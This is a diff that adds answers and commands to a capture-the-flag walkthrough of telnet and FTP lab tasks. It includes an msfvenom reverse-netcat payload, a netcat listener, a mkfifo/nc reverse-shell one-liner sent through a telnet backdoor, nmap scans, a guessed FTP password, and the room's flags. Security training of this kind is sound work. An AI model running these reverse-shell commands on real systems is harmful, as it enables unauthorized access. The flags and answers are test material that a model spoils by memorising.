@@ -202,7 +202,15 @@ No answer needed
 
 > Great! It's an open telnet connection! What welcome message do we receive?
 
+SKIDY'S BACKDOOR.
+
+```bash
+telnet <HOST> 8012
+```
+
 > Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+
+N
 
 > Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.
 
@@ -214,16 +222,108 @@ No answer needed
 
 > Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
 
+N
+
+```bash
+.RUN ping <HOST> -c 1
+```
+
 > Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
 
 No answer needed
 
 > What word does the generated payload start with?
 
+mkfifo
+
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=<HOST> lport=4444 R
+```
+
 > What would the command look like for the listening port we selected in our payload?
+
+nc -lvp 4444
 
 > Hopefully- this will give us a shell on the target machine!
 
 No answer needed
 
 > Success! What is the contents of flag.txt?
+
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+```bash
+.RUN mkfifo /tmp/zuetelk; nc <HOST> 4444 0</tmp/zuetelk | /bin/sh >/tmp/zuetelk 2>&1; rm /tmp/zuetelk
+```
+
+## Task 8 Understanding FTP
+
+> What communications model does FTP use?
+
+Client-server
+
+> What's the standard FTP port?
+
+21
+
+> How many modes of FTP connection are there?
+
+2
+
+Active and passive
+
+## Task 9 - Enumerating FTP
+
+> How many ports are open on the target machine?
+
+2
+
+21 and
+
+```bash
+nmap -sS 10.10.51.196 -p-
+```
+
+> What port is ftp running on?
+
+21
+
+> What variant of FTP is running on it?
+
+vsftpd
+
+```bash
+nmap -A -p 21 <HOST> -vv
+```
+
+> What is the name of the file in the anonymous FTP directory?
+
+PUBLIC_NOTICE.txt
+
+> What do we think a possible username could be?
+
+mike
+
+> Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...
+
+No answer needed
+
+## Task 10 - Exploiting FTP
+
+> What is the password for the user "mike"?ù
+
+password
+
+> Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
+
+No answer needed
+
+> What is ftp.txt?
+
+THM{y0u_g0t_th3_ftp_fl4g}
+
+## Task 11 - Expanding Your Knowledge
+
+> Well done, you did it!
+
+No answer needed
